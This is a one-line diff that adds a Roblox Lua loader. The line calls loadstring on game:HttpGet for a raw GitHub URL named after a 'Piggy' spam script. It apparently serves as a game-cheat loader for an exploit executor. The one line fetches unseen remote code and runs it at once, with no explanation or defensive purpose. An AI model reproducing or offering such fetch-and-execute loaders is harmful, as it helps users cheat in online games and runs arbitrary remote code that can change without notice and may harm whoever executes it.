@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Docktuangular/loaders/main/loaders/piggy-frightful-carnival-spam7-sfi8gw72obj00a.lua"))()
